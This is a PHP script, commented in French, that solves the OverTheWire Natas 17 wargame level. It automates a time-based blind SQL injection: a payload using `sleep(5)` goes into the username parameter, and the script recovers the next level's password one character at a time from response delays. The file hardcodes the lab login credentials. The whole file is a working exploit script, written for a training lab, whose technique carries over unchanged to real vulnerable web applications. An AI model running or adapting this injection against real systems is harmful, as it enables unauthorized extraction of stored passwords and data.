<?php
// Base URL du challenge
$base_url = "http://natas17.natas.labs.overthewire.org/";
// Nom d'utilisateur pour l'injection SQL
$username = "natas18\"";

// Caractères à tester
$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$password = "";

// Initialisation de cURL
$ch = curl_init();

// Configuration de cURL pour l'authentification
curl_setopt($ch, CURLOPT_USERPWD, "natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);

// Temps de référence pour les réponses retardées (en secondes)
$delayThreshold = 5;

// Test de chaque caractère
for ($i = 0; $i < 32; $i++) {
    foreach (str_split($characters) as $char) {
        $query = $username . " and if(password LIKE BINARY \"" . $password . $char . "%\", sleep(5), 'false'); #";
        $url = $base_url . "?username=" . urlencode($query) . "&debug";

        // Envoi de la requête
        curl_setopt($ch, CURLOPT_URL, $url);
        $startTime = microtime(true);
        curl_exec($ch);
        $endTime = microtime(true);

        // Calculer la durée de la requête
        $duration = $endTime - $startTime;

        // Vérifier si la requête a été retardée
        if ($duration >= $delayThreshold) {
            $password .= $char;
            echo "Password found so far: " . $password . "\n";
            break;
        }
    }
}

// Fermeture de la session cURL
curl_close($ch);

echo "Final password: " . $password . "\n";
?>
